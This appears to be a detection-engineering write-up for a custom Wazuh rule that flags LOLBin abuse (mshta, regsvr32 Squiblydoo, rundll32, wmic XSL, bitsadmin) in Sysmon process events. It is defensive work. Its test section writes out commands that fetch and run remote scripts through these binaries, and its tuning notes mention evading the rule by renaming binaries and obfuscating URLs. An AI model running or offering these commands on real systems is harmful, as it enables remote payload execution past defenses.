# 100250 — LOLBin abuse (non-certutil paths)

| Field | Value |
|---|---|
| Rule ID | 100250 |
| Level | 12 |
| MITRE technique | [T1218 — System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218/), [T1105 — Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/) |
| Tactic | TA0005 Defense Evasion / TA0002 Execution |
| Parent group | `sysmon_event1` (Sysmon EventID 1, process create) |
| Telemetry | Sysmon `Microsoft-Windows-Sysmon/Operational` |
| Status | 🟡 Deployed; Defender ASR preempts some paths on hardened endpoints |

## Detection logic

```xml
<rule id="100250" level="12">
  <if_group>sysmon_event1</if_group>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)(mshta.*\b(http|javascript:)|regsvr32.*\/i:http|regsvr32.*scrobj\.dll|rundll32.*javascript:|wmic.*\/format:.*http|bitsadmin.*\/transfer)</field>
  <description>LOLBin abuse pattern: $(win.eventdata.image)</description>
  <mitre><id>T1218</id><id>T1105</id></mitre>
</rule>
```

Single regex against the command line of any Sysmon process-create event, covering five living-off-the-land patterns drawn from LOLBAS:

| Binary | Pattern | Technique |
|---|---|---|
| `mshta` | `mshta <http url>` or `mshta javascript:...` | T1218.005 |
| `regsvr32` | `/i:http://...` or `scrobj.dll` | T1218.010 (Squiblydoo) |
| `rundll32` | `javascript:...` | T1218.011 |
| `wmic` | `/format:http://...` | T1220 (XSL Script Processing) |
| `bitsadmin` | `/transfer` | T1197 |

## What's NOT here, and why

**certutil patterns are intentionally excluded.** Stock Wazuh ships three rules covering certutil abuse:

- `92016` (level 13) — "Masqueraded CertUtil.exe with a different file name"
- `92017` (level 13) — "Masqueraded CertUtil.exe used to decode binary file"
- `92018` (level 13) — "CertUtil.exe used to decode binary file"

The earlier draft of this rule included certutil patterns and would have duplicated this stock coverage. Removed to keep the custom ruleset focused on genuine gaps. See [`../docs/findings.md`](../docs/findings.md) #10 for the full stock-coverage analysis.

## Test methodology

```powershell
# bitsadmin transfer (least likely to be ASR-preempted)
bitsadmin /transfer testjob /download /priority normal http://example.com/test.txt %TEMP%\bits.txt

# mshta with HTTP target (Defender ASR may preempt)
mshta.exe http://example.com/test.hta

# regsvr32 Squiblydoo (Defender ASR may preempt)
regsvr32 /s /u /i:http://example.com/test.sct scrobj.dll
```

## Observed status

Rule deployed and parse-validated.

On Freddy-PC, Defender ASR (rules blocking JavaScript/VBScript from launching downloaded executable content, and process creations from PSExec/WMI commands) preempts the actual execution of mshta and regsvr32 with HTTP targets. The process-create event still fires before the block, so Sysmon EventID 1 is emitted and the rule should match on the attempted invocation — full end-to-end validation pending Range VM with Defender disabled.

bitsadmin `/transfer` is the most testable path on Freddy-PC because Defender is generally less aggressive about it.

## Tuning notes

- **Renamed-binary bypass partially mitigated** — the rule keys on command-line text (e.g. `mshta.*http`), not the image name. An attacker renaming `mshta.exe` to `m.exe` still triggers the regex via the http/javascript: anchor. A more aggressive bypass (renaming the binary AND obfuscating the URL pattern) would slip through; a follow-up rule using Sysmon's `OriginalFileName` field would harden this further
- **rundll32 false positives** — Windows itself uses rundll32 extensively but never with `javascript:` prefix. This anchor is essentially zero-noise on a desktop
- **wmic xsl false positives** — `wmic /format:` is rarely used legitimately. Zero-noise on a desktop in practice

## Cross-references

- [LOLBAS Project](https://lolbas-project.github.io/)
- [`../docs/findings.md`](../docs/findings.md) #1 (Defender ASR effect on testing) and #10 (stock-coverage analysis)
- [`100290-ps-download-cradle.md`](./100290-ps-download-cradle.md) — companion rule for the PowerShell-native download path
